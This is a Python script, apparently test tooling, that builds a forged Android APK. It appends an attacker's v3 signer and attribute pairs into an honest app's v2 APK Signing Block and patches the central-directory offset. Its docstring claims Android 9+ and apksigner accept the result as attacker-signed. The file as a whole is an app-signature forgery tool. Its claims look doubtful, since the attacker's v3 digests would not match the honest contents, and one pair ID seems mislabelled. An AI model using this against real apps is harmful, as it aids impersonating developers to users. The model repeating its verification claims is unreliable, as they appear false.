#!/usr/bin/env python3
"""
Builds the "appended v3 signature" forgery used by the signature-verifier tests.

  honest.apk : signed v2-only with the DEVELOPER key
  atk.apk    : signed v3-only with the ATTACKER key

  forged.apk : honest.apk's contents and signature block, with the attacker's
               v3 signer + signing-attribute pairs appended into the same
               APK Signing Block.

Android 9+ sees a v3 block and stops validating v2 entirely, so the result
installs and `PackageManager#apkContentsSigners` reports the ATTACKER
certificate. `apksigner verify` accepts it:

    Verifies
    Verified using v2 scheme (APK Signature Scheme v2): false
    Verified using v3 scheme (APK Signature Scheme v3): true
    Signer #1 certificate DN: CN=Attacker

Signing block layout (all little-endian):

    [ u64 blockSize ][ seq of (u64 len, u32 id, u8 value[len-4]) ][ u64 blockSize ][ magic16 ]
    blockSize = totalBlockLen - 8

Pair ids, as stored:
    0x7109871a -> APK Signature Scheme v2 signers
    0xf05368c0 -> APK Signature Scheme v3.0 signers
    0x42726577 -> signing attributes
"""
import struct
import sys

MAGIC = b"APK Sig Block 42"
ID_V2 = 0x7109871A
ID_V3 = 0xF05368C0
ID_ATTR = 0x42726577


def read_block(apk):
    """Return (blockStart, blockEnd) for an APK carrying a signing block."""
    eocd = apk.rfind(b"PK\x05\x06")
    if eocd < 0:
        raise SystemExit("no End-Of-Central-Directory record")
    (central_dir_offset,) = struct.unpack_from("<I", apk, eocd + 16)
    magic_offset = central_dir_offset - len(MAGIC)
    if apk[magic_offset:magic_offset + len(MAGIC)] != MAGIC:
        raise SystemExit("no APK Signing Block magic before the central directory")
    (size,) = struct.unpack_from("<Q", apk, magic_offset - 8)
    start = magic_offset + 8 - size
    if struct.unpack_from("<Q", apk, start)[0] != size:
        raise SystemExit("signing block size fields disagree")
    return start, central_dir_offset


def read_pairs(apk, start, end):
    """Yield (id, rawBytes) for every pair; rawBytes includes the 4-byte id."""
    pos, stop = start + 8, end - len(MAGIC) - 8
    out = []
    while pos < stop:
        (length,) = struct.unpack_from("<Q", apk, pos)
        if length > stop - pos:
            raise SystemExit("pair length overflows the block")
        out.append((struct.unpack_from("<I", apk, pos + 8)[0], apk[pos + 8:pos + 8 + length]))
        pos += 8 + length
    if pos != stop:
        raise SystemExit("signing block walk did not reach the end")
    return out


def build_block(pairs):
    body = b"".join(struct.pack("<Q", len(raw)) + raw for _, raw in pairs)
    size = len(body) + 24
    return struct.pack("<Q", size) + body + struct.pack("<Q", size) + MAGIC


def fix_central_dir_offset(apk, delta):
    eocd = apk.rfind(b"PK\x05\x06")
    (offset,) = struct.unpack_from("<I", apk, eocd + 16)
    return apk[:eocd + 16] + struct.pack("<I", offset + delta) + apk[eocd + 20:]


def main(honest_path, attacker_path, out_path):
    honest = open(honest_path, "rb").read()
    attacker = open(attacker_path, "rb").read()

    start, end = read_block(honest)
    keep = [(i, r) for i, r in read_pairs(honest, start, end) if i in (ID_V2, ID_ATTR)]

    a_start, a_end = read_block(attacker)
    append = [(i, r) for i, r in read_pairs(attacker, a_start, a_end) if i in (ID_V3, ID_ATTR)]

    print("keeping :", [hex(i) for i, _ in keep])
    print("appending:", [hex(i) for i, _ in append])

    block = build_block(keep + append)
    forged = honest[:start] + block + honest[end:]
    forged = fix_central_dir_offset(forged, len(block) - (end - start))

    open(out_path, "wb").write(forged)
    print("wrote %s (%d bytes)" % (out_path, len(forged)))


if __name__ == "__main__":
    main(sys.argv[1], sys.argv[2], sys.argv[3])
